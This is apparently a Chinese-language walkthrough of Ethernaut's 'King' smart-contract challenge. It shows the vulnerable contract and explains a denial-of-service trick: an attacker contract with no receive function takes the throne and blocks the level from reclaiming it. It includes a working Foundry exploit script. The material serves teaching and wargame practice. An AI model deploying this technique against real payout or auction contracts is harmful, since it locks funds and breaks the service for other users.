# Level 9 - King
## 題目
[King](https://ethernaut.openzeppelin.com/level/0x3049C00639E6dfC269ED1451764a046f7aE500c6)
### 通關條件
下面的合約是一個很簡單的遊戲：任何發送了高於目前獎品 ether 數量的人將成為新的國王。在這個遊戲中，新的獎拼會支付給被推翻的國王，在這過程中就可以賺到一點 ether。看起來是不是有點像龐氏騙局 (*´∀`)~♥ 這麽好玩的遊戲，你的目標就是攻破它。 當你提交實例給關卡時，關卡會重新申明他的王位所有權。如果要通過這一關，你必須要阻止它重獲王位才行 (ﾒﾟДﾟ)ﾒ
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
## 解題
先搞懂題目合約的功能：A 轉進去 100 成為國王，B 必須要轉進去大於 100 的金額才可以成為新的國王，當 B 變成國王時，A 可以拿到 B 轉進去的錢。

另外每次提交時，關卡都會重新搶一次國王，所以重點是如何讓關卡搶王位失敗；也就是讓它轉帳失敗就可以讓他無法搶到王位了，關於轉帳失敗在 [Level 7 - Force](https://hackmd.io/@D13/ethernaut7) 有提到只要合約沒有 `receice()` 和 `fallback() payable` 時，是無法收款的。

總結我們的攻擊流程：
1. 寫一個合約，轉帳給關卡合約成為國王
2. 合約內不要用任何收款函數，這樣關卡重新奪位時會因為交易失敗導致無法成為國王

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/09_King.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        KingAttacker kingAttacker = new KingAttacker{value:0.001 ether}(your_challenge_address);
        kingAttacker.attack();

        vm.stopBroadcast();
    }
}

contract KingAttacker {
    address public challengeInstance;

    constructor(address _challengeInstance) payable {
        challengeInstance = _challengeInstance;
    }

    function attack() external {
        (bool success, ) = payable(challengeInstance).call{value: 0.001 ether}("");
    }
}
```